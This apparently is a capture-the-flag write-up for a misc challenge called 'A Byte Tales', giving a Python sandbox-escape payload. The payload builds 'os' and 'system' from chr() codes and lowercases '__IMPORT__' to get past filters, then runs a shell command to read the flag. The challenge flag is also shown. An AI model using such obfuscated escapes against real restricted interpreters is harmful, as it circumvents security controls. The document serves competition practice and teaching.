---
icon: globe-pointer
description: Here are the write-ups for misc challenges that I solved during the competition
---
# A Byte Tales
## Solution

![](attachments/abytetales-exploited.png)

It's a basic pyjail escape. Here's the payload

```python
__builtins__.__dict__['__IMPORT__'.lower()](''.join([chr(111), chr(115)])).__dict__[''.join([chr(115), chr(121), chr(115), chr(116), chr(101), chr(109)])]('cat flag.txt')
```

Flag: SIBER25{St1ck_70_7h3_5toryl1n3!}